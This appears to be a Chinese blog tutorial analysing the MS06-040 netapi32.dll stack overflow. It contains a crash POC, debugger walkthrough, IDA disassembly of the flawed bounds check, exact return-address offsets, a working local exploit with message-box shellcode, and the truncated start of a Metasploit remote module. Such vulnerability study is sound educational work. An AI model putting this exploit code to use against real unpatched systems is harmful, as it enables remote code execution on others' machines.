class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 6.3k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 29(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>[toc]</p><h1 id="rpc-漏洞"><a class="markdownIt-Anchor" href="#rpc-漏洞"></a> RPC 漏洞</h1><h2 id="rpc-漏洞简介"><a class="markdownIt-Anchor" href="#rpc-漏洞简介"></a> RPC 漏洞简介</h2><p>RPC 即 Remote Procedure Call，它是一种计算机进程间的通信方式。简单地说，RPC 就是让您在自己地程序中调用一个函数（可能需要很大地计算量），而这个函数在另外一个或多个远程机器上执行，执行完后将结果传回您的机器进行后续操作。</p><p>RPC漏洞，远程调用函数出现了问题，甚至有可被利用的安全漏洞。</p><h2 id="rpc编程简介"><a class="markdownIt-Anchor" href="#rpc编程简介"></a> RPC编程简介</h2><p>在 VC 中进行 RPC 调用的流程如下图所示。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220713220518781.png" alt="image-20220713220518781"><p>使用 RPC 调用时首先应当定义远程进程的接口 IDL 文件。 IDL（ Interface Description Language）是专门用来定义接口的语言，在这个文件里我们要指定 RPC 的接口信息以及 interface 下的 function 信息，包括函数的声明，参数等。</p><p>微软的 IDL 叫做 MIDL， 是兼容 IDL 标准的。定义好的 IDL 文件接口经过微软的 MIDL 编译器编译后会生成 3 个文件，一个客户端 stub（有些文献把 stub 翻译成“插桩”或“码桩”），一个服务端 stub，还有一个 RPC 调用的头文件。其中 stub 负责 RPC 调用过程中所有的网络操作细节。</p><p>在本章中将会用到 MS06-040 所需的接口文件，您可在看雪相关板块中下载附件。用 MIDL 编译接口文件rpc_exploit_040.acf 和 rpc_exploit_040.idl，得到 stub 文件和头文件。MIDL 编译器在 VC6.0 的组件里，可以在命令行下使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">midl /acf rpc_exploit_040.acf rpc_exploit_040.idl</span><br></pre></td></tr></table></figure><p>编译成功后，会在当前路径生成 3 个文件：<br>（ 1） rpc_exploit_040_s.c RPC 服务端 stub（桩）<br>（ 2） rpc_exploit_040_c.c R PC 客户端 stub（桩）<br>（ 3） rpc_exploit_040.h RPC 头文件</p><p>把两个 stub 添加进工程， include 头文件，和调用远程函数的程序一起 link，您就可以试着<br>去调用远程主机上的函数了。</p><h1 id="ms06-040"><a class="markdownIt-Anchor" href="#ms06-040"></a> MS06-040</h1><h2 id="ms06-040-简介"><a class="markdownIt-Anchor" href="#ms06-040-简介"></a> MS06-040 简介</h2><p>MS06-040 是这个漏洞的微软编号，其 CVE 编号为 CVE-2006-3439，对应补丁号为KB921883。</p><p>几乎所有使用 socket 网络的程序都会加载负责网络操作的 netapi32.dll。 MS06-040 指的就是这个动态链接库中的导出函数 NetpwPathCanonicalize() 中存在的缓冲溢出缺陷，而NetpwPathCanonicalize() 函数又可以被 RPC 远程调用，所以才会有这么大的危害。</p><h3 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h3><p>NetpwPathCanonicalize()是 netapi32.dll 的一个导出函数，用于格式化网络路径字符串，它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">NetpwPathCanonicalize</span> <span class="params">(</span></span><br><span class="line"><span class="params">	uint16      path[ ],            <span class="comment">//[in]      path name</span></span></span><br><span class="line"><span class="params">	uint8       can_path[ ],        <span class="comment">//[out]     canonicalizedpath</span></span></span><br><span class="line"><span class="params">	uint32      maxbuf,             <span class="comment">//[in]      max size of can_path</span></span></span><br><span class="line"><span class="params">	uint16      prefix[ ],          <span class="comment">//[in]      path prefix</span></span></span><br><span class="line"><span class="params">	uint32*     pathtype,           <span class="comment">//[in out]  path type</span></span></span><br><span class="line"><span class="params">	uint32      pathflags           <span class="comment">//[in]      path flags, 0 or 1</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>这是一个 Unicode 字符串处理函数，大体功能是：如果 prefix 串非空，将 prefix 串与 path串用‘ \’相连，并复制到输出串 can_path 中，输出串的容量为 maxbuf 字节大小：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prefix ＋ ‘\’ ＋ path =&gt; can_path [max_buf]</span><br></pre></td></tr></table></figure><p>在路径合并过程中，函数会做各种检查，如 prefix 或 path 长度是否越界、是否符合路径规范，或 can_path 的容量是否够大等等，否则函数将退出，并返回相应的错误号，例如，ERROR_INVALID_NAME （ 0x7B ）， ERROR_INVALID_PARAMETER （ 0x135 ），NERR_BufTooSmall（ 0x84B）等；函数成功则返回 0，并对 pathtype 进行更新。</p><p>首先在本地直接装载有漏洞的动态链接库，并调用这个函数，等到弄清楚栈中的细节之后，再实践远程利用。</p><p>触发这个漏洞的 POC 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf = <span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype = <span class="number">44</span>;</span><br><span class="line"> </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>;</span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(path) - <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="number">0</span>, <span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix, <span class="string">&#x27;b&#x27;</span>, <span class="keyword">sizeof</span>(prefix) - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    (Trigger)(path, can_path, maxbuf, prefix, &amp;pathtype, <span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的功能是装载存在漏洞的 netapi32.dll，并调用其导出函数 NetpwPathCanonicalize。在函数调用时我们将 path 和 prefix 设置成很长的字符串，用以触发栈溢出。注意这个字符串以两个字节的 null 结束，这是因为 NetpwPathCanonicalize 将按照 Unicode 来处理字符串。</p><p>memset()函数，将缓冲区设置为指定字符。</p><table><thead><tr><th></th><th>推荐的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>winXP SP3</td><td>本地调试与操作系统版本无关</td></tr><tr><td>漏洞文件</td><td>netapi32.dll</td><td>在没有 patch 过 KB921883 的 Window 2000 操作系统中，该文件位于 c:\winnt\system32 下 ； 若操作系统已经被 patch ， 可 以在 c:\winnt$NtUninstallKB921883$下找到该文件；您也可以在本章的附带资料中找到这个动态链接库文件</td></tr><tr><td>编译器</td><td>VC++ 6.0</td><td></td></tr><tr><td>编译选项</td><td>默认编译选项</td><td></td></tr><tr><td>build 版本</td><td>Release 版本</td><td>debug 版本在调试时可能会有细节上的差异</td></tr></tbody></table><blockquote><p>注意： 需要未打补丁的netapi32.dll，Windows 2000在C:\WINNT\system32目录下能找到，或者用以下提供的dll，但远程exploit必须要带有未打补丁dll的系统。本实验指导的调试基于使用的漏洞文件大小为 309008 字节，您可以在本章附带的电子资料中找到这个文件，请您在编译运行 POC 代码时将这个漏洞文件放在工程的相同路径下。</p></blockquote><blockquote><p>netapi32.dll 下载链接:<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qZQ1vnY">https://pan.baidu.com/s/1qZQ1vnY</a> 密码:5stq</p></blockquote><h4 id="定位程序崩溃点"><a class="markdownIt-Anchor" href="#定位程序崩溃点"></a> 定位程序崩溃点</h4><p>编译运行后，系统会提示出错，直接点调试。进入OD后，按 F9 运行到程序崩溃处，可以看到 EBP 和 EIP 都被覆盖为 “aaaa”。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714123823178-16577739716151.png" alt="image-20220714123823178"></p><p>重新加载程序，调试来到 call netapi32.NetpwPathCanonicalize 处。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714124834735.png" alt="image-20220714124834735"></p><p>进入 NetpwPathCanonicalize() 函数体后，按 “F8” 键继续单步跟踪。程序将在另一次函数调用时崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714132056431.png" alt="image-20220714132056431"></p><p>重新加载，“F7” 继续跟进，最后发现，在函数返回前 pop ebx 中，向栈中压入了大量 b 充当无效数据，导致在 retn 时，返回地址错误，发生崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714125708003.png" alt="image-20220714125708003"></p><h4 id="构造exploit"><a class="markdownIt-Anchor" href="#构造exploit"></a> 构造exploit</h4><p>反复跟踪后溢出函数后，发现这段程序首先将 prefix 所指的字符串“ bbbbbb……” 复制到栈中，然后在这个字符串后加上 Unicode 字符“\”（ 0x5C00），再将 path 中的长字符串“ aaaa……”连接在末尾，而正是连接 path 串的 wcscat 调用触发了漏洞。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714133733738.png" alt="image-20220714133733738"></p><p>程序“跑飞”之前的系统状态。<br>（ 1） prefix 串中包含了 0xFE 个字符‘b’（ 0x62），被复制到栈帧中开始于 0x0012F240 处的缓冲区。<br>（ 2）程序在 prefix 的末尾连接上 Unicode 字符‘ \’（ 0x005C）。<br>（ 3）程序在‘ \’后连接 0x31E 个字符‘ a’（ 0x61），这次字符串连接操作造成了栈帧溢出，位于 0x0012F654 处的 EBP 及紧随其后的返回地址都被改写。(图26.2.6地址与本次实验地址不同)</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717224801801.png" alt="image-20220717224801801"></p><p>ECX 在函数返回时总是指向栈中缓冲区，因此我们可以把 shellcode 放在 prefix 串中，并采用JMP ECX 作为定位 shellcode 的跳板。用 OllyDbg 在内存中搜索指令 JMP ECX。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714152047332.png" alt="image-20220714152047332"></p><p>用 netapi32.dll 自身代码空间中 0x751852F9 处的 CALL ECX 作为跳转指令。</p><p>布置缓冲区如下。<br>（ 1）缓冲区中的内容为： (prefi x:bbb …) +（ \） +（ path: aaa…）。<br>（ 2）目前 prefix 串大小为 0x100（ 256）字节，除去两个字节 null 作为结束符， 254 字节基本能够容纳 shellcode。<br>（ 3）缓冲区起址： 0x0012F240。<br>（ 4） EBP 位置： 0x0012F654。<br>（ 5）返回地址： 0x0012F240。<br>（ 6）返回地址距离缓冲区的偏移为： 0x0012F654-0x0012F240=0x418，去掉 prefix 和 ‘ \’ 的影响， path 串偏移 0x418-0x100=0x318 处的 DWORD 将淹没返回地址，在那里填入跳转地址即可执行 shellcode。</p><p>仍然使用弹出“ failwest”消息框的 shellcode 进行测试，最终的本地溢出利用代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0x90</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(prefix,shellcode,<span class="number">168</span>);</span><br><span class="line">    path[<span class="number">0x318</span>]=<span class="number">0xF9</span>;<span class="comment">// address of CALL ECX</span></span><br><span class="line">    path[<span class="number">0x319</span>]=<span class="number">0x52</span>;</span><br><span class="line">    path[<span class="number">0x31A</span>]=<span class="number">0x18</span>;</span><br><span class="line">    path[<span class="number">0x31B</span>]=<span class="number">0x75</span>;</span><br><span class="line">    (Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行，就能看到 failwest 消息框了。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714153344604.png" alt="image-20220714153344604" style="zoom:50%"><p>总结一下动态调试的思路。<br>（ 1）第一次调试看到 EIP 已经被改写为 0x61616161，证明传入的参数可以制造溢出并控制EIP，但堆栈被破坏，无法看到溢出前的函数调用。<br>（ 2）跟踪调试，找到 NetpwPathCanonicalize 的 VA 地址，直接对这个 VA 地址下断点。<br>（ 3）单步跟踪 NetpwPathCanonicalize 函数，观察寄存器的变化，发现是其中的一次函数调用引起的错误。<br>（ 4）第三次调试直接针对 NetpwPathCanonicalize 中引起错误的子函数，单步跟踪一轮后，彻底弄清楚栈中布局，编写本地 exploit。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>通过 IDA 加载 netapi32.dll，找到漏洞的缺陷代码，NetpwPathCanonicalize 函数中的 CanoicalizePathName 函数，如下图黄色框内。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714223348998.png" alt="image-20220714223348998"><p>在动态调试时，我们已经知道产生溢出的函数实际上是 0x7517F856 处调用的的子函数 CanonicalizePathName()， prefix 串与 path 串的合并操作就位于其中，该函数的声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CanonicalizePathName</span> <span class="params">(</span></span><br><span class="line"><span class="params">    uint16 	prefix[ ], 		<span class="comment">// [in] path prefix</span></span></span><br><span class="line"><span class="params">    uint16	path[ ], 		<span class="comment">// [in] path name</span></span></span><br><span class="line"><span class="params">    uint8 	can_path[ ], 	<span class="comment">// [out] canonicalized path</span></span></span><br><span class="line"><span class="params">    uint32 	maxbuf, 		<span class="comment">// [in] max byte size of can_path</span></span></span><br><span class="line"><span class="params">    uint32 	can_size 		<span class="comment">// [in out] byte size of can_path</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>用 IDA 重点看一下这个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span class="line">; int   stdcall CanonicalizePathName(wchar_t *, wchar_t *, wchar_t*, int, int)</span><br><span class="line">7517FC68 CanonicalizePathName proc near</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 Buff_last_word  = word ptr -416h</span><br><span class="line">7517FC68 Buff_OF         = word ptr -414h</span><br><span class="line">7517FC68 arg_Prefix      = dword ptr  8</span><br><span class="line">7517FC68 arg_Path        = dword ptr  0Ch</span><br><span class="line">7517FC68 arg_CanPath     = dword ptr  10h</span><br><span class="line">7517FC68 arg_Maxbuf      = dword ptr  14h</span><br><span class="line">7517FC68 arg_CanSize     = dword ptr  18h</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 push   ebp</span><br><span class="line">7517FC69 mov    ebp, esp</span><br><span class="line">7517FC6B sub esp, 414h 	; 分配 0x414 字节栈空间，即 Buff_OF，用来</span><br><span class="line">						; 存储合并路径(prefix+’\’+path)</span><br><span class="line">7517FC71 push ebx</span><br><span class="line">7517FC72 push esi</span><br><span class="line">7517FC73 xor esi, esi</span><br><span class="line">7517FC75 push edi</span><br><span class="line">7517FC76 cmp [ebp+arg_Prefix], esi</span><br><span class="line">7517FC79 mov edi, ds:__imp_wcslen</span><br><span class="line">7517FC7F mov ebx, 411h 	; ebx 始终等于 0x411，用于检查越界（字节）</span><br><span class="line">						; 长度</span><br><span class="line">7517FC84 jz short @@prefix_ptr_zero</span><br><span class="line">7517FC86 push [ebp+arg_Prefix]</span><br><span class="line">7517FC89 call edi ; __imp_wcslen</span><br><span class="line">                        ; 计算 prefix 串的 Unicode 长度，注意为字</span><br><span class="line">                        ; 节长度的一半，这是导致边界检查被突破的根</span><br><span class="line">                        ; 本原因，即用 Unicode 检查边界，而栈空间</span><br><span class="line">                        ; 是按字节开的</span><br><span class="line">7517FC8B mov esi, eax 	; esi 始终记录 prefix 串的 Unicode 长度</span><br><span class="line">7517FC8D pop ecx</span><br><span class="line">7517FC8E test esi, esi</span><br><span class="line">7517FC90 jz short @@chk_pathname</span><br><span class="line">7517FC92 cmp esi, ebx 	; prefix 是否大于 0x411</span><br><span class="line">7517FC94 ja @@err_invalid_name</span><br><span class="line">						; 若越界，则退出程序</span><br><span class="line">7517FC9A push [ebp+arg_Prefix]</span><br><span class="line">7517FC9D lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FCA3 push eax</span><br><span class="line">7517FCA4 call ds:__imp_wcscpy</span><br><span class="line">                        ; 将 prefix 串写入栈空间 Buff_OF 暂存。虽然前</span><br><span class="line">                        ; 面的边界检查有缺陷，似乎实际可以传入的 prefix</span><br><span class="line">                        ; 串可以达到 0x822 字节，但是在传入本函数前,</span><br><span class="line">                        ; prefix 串已被 NetpwPathType()检查过，其长度</span><br><span class="line">                        ; 不能超过 0x206 字节，所以光靠这里的检查缺陷</span><br><span class="line">                        ; 还不足以通过 prefix 串制造溢出</span><br><span class="line">…</span><br><span class="line">7517FCED @@prefix_ptr_zero:</span><br><span class="line">7517FCED mov [ebp+Buff_OF], si</span><br><span class="line">7517FCF4 @@chk_pathname:</span><br><span class="line">7517FCF4 push [ebp+arg_Path]</span><br><span class="line">7517FCF7 call edi ; __imp_wcslen</span><br><span class="line">						; 计算 path 串的 Unicode 长度</span><br><span class="line">7517FCF9 add eax, esi 	; 合并前，计算合并路径(prefix+’\’+path)的</span><br><span class="line">						; Unicode 长度</span><br><span class="line">7517FCFB pop ecx</span><br><span class="line">7517FCFC cmp eax, ebx 	; 第二次边界检查，仍然将 Unicode 字符长度与</span><br><span class="line">						; 字节长度 0x411 进行比较</span><br><span class="line">7517FCFE ja short @@err_invalid_name</span><br><span class="line">                        ; 从前面的分析可以知道，只靠 prefix 串是无法</span><br><span class="line">                        ; 制造溢出的，但是 path 串的传入没有任何限制，</span><br><span class="line">                        ; 所以可以通过增加 path 串的长度溢出。栈空间</span><br><span class="line">                        ; 为 0x414，我们实际可以传入的串总长可以达到</span><br><span class="line">                        ; 或或超过 0x828</span><br><span class="line">7517FD00 push [ebp+arg_Path]</span><br><span class="line">7517FD03 lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FD09 push eax</span><br><span class="line">7517FD0A call ds:__imp_wcscat 	; 将 path 串继续连入 Buff_OF，生成最终</span><br><span class="line">                                ; 的合并路径，这个调用导致了最终的栈溢出</span><br><span class="line">…</span><br><span class="line">7517FD3E @@err_invalid_name:</span><br><span class="line">7517FD3E push ERROR_INVALID_NAME</span><br><span class="line">7517FD40 pop eax</span><br><span class="line">7517FD41 jmp short @@quit</span><br><span class="line">…</span><br><span class="line">7517FD7A @@quit:</span><br><span class="line">7517FD7A pop edi</span><br><span class="line">7517FD7B pop esi</span><br><span class="line">7517FD7C pop ebx</span><br><span class="line">7517FD7D leave</span><br><span class="line">7517FD7E retn 14h</span><br><span class="line">7517FD7E CanonicalizePathName endp</span><br><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>两次边界检查的限制都是 Unicode 长度不能超过 0x411，换算成字节长度就是 0x822，而栈空间的大小是按字节开的 0x414。按照 ASCII 字符开辟空间，按照 Unicode 字符来检查边界是漏洞的根本原因。<br>依据以上的溢出原理，只要设计好 prefix 串和 path 串的长度，调用 NetpwPath Canonicalize 函数即可发生栈溢出。</p><h2 id="实现远程-exploit"><a class="markdownIt-Anchor" href="#实现远程-exploit"></a> 实现远程 exploit</h2><p>进行 RPC 调用的代码框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                     </span><br><span class="line">end</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>     =&gt; <span 